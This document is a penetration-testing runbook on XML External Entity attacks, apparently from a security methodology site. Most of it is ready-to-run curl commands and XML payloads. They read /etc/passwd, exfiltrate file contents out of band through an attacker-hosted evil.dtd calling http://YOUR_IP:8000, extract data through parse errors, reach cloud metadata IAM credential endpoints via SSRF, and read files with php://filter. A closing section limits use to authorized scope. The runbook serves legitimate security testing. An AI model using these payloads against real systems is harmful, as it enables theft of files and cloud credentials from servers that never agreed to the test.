---
title: "XXE — XML External Entity"
description: "Classic, blind, and error-based XXE for file read and SSRF, plus parameter entities and parser bypasses, with safe proof."
phase: Web
order: 79
tags:
  - xxe
  - xml
  - ssrf
  - file-read
tools:
  - burp suite
  - xxe-injector
  - curl
updated: 2026-10-01
---

XXE abuses XML parsers that resolve external entities. A single DOCTYPE can read local files or make the server send requests for you. This runbook moves from direct file read to blind OOB exfiltration, error-based extraction, SSRF, and parser bypasses — on **in-scope** targets only.

## 1. Find XML-accepting endpoints

Anything parsing XML: SOAP, SAML, REST accepting `application/xml`, SVG/DOCX/XLSX uploads, RSS importers.

```bash
# XML accepted? then confirm entity resolution (fails silently if disabled)
curl -s -i -X POST https://target.com/api -H "Content-Type: application/xml" \
  --data '<!DOCTYPE r [<!ENTITY e "resolved">]><r>&e;</r>' | head -n 20
```

## 2. Classic in-band XXE

Define and use an entity whose value is a local file; if it reflects, you have read.

```bash
cat > xxe.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
EOF
curl -s -X POST https://target.com/api \
  -H "Content-Type: application/xml" --data-binary @xxe.xml | head -n 40
# also try file://, http://, and platform paths (C:\Windows\win.ini, /etc/hostname)
```

## 3. Blind / out-of-band XXE

When the value is not reflected, exfiltrate through an external DTD you host.

```bash
xxe-ftp-server -p 2121 -f          # OOB file exfil over FTP
python3 -m http.server 8000        # serve evil.dtd:
#   <!ENTITY % file SYSTEM "file:///etc/passwd">
#   <!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR_IP:8000/?d=%file;'>"> %all;

curl -s -X POST https://target.com/api -H "Content-Type: application/xml" --data \
'<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://YOUR_IP:8000/evil.dtd">%dtd;]><root>test</root>'
```

Watch your HTTP logs for `/?d=...`. Use `interactsh-client` to confirm the channel.

## 4. Error-based XXE

If outbound HTTP is blocked, force the parser to embed the data in a parse error.

```bash
cat > error.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %eval; %err;
]>
<root>x</root>
EOF
curl -s -i -X POST https://target.com/api \
  -H "Content-Type: application/xml" --data-binary @error.xml | head -n 40
```

## 5. SSRF and parser bypasses

```bash
# SSRF to cloud metadata
curl -s -X POST https://target.com/api -H "Content-Type: application/xml" \
  --data '<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><r>&x;</r>'

# PHP filter wrapper for binary/filtered files
curl -s -X POST https://target.com/api -H "Content-Type: application/xml" \
  --data '<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>'
```

Also try UTF-16/BOM-shifted documents, entities hidden in SVG/DOCX/XLSX uploads, and alternative protocols (`expect://`, `gopher://`, `jar:`).

## Full pipeline

```bash
U="https://target.com/api"; H='Content-Type: application/xml'

# 1. Confirm XML/entity handling
curl -s -X POST "$U" -H "$H" --data '<!DOCTYPE r [<!ENTITY e "resolved">]><r>&e;</r>'
# 2. In-band file read
curl -s -X POST "$U" -H "$H" --data-binary @xxe.xml | head -n 40
# 3. Blind OOB (start listener + evil.dtd first)
xxe-ftp-server -p 2121 -f & python3 -m http.server 8000 &
curl -s -X POST "$U" -H "$H" --data \
'<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://YOUR_IP:8000/evil.dtd">%dtd;]><root>test</root>'
# 4. Error-based fallback
curl -s -i -X POST "$U" -H "$H" --data-binary @error.xml | head -n 40
# 5. SSRF + PHP filter read
curl -s -X POST "$U" -H "$H" \
  --data '<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><r>&x;</r>'
curl -s -X POST "$U" -H "$H" \
  --data '<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>'
```

## Ethics & legality

- Only send XXE payloads to endpoints within an authorized scope.
- Use your own OOB/listener infrastructure; never exfiltrate real credentials.
- Prove metadata SSRF with reachability only and mint no tokens.
- Bound blind extraction and keep the request rate low; log payloads and callbacks.
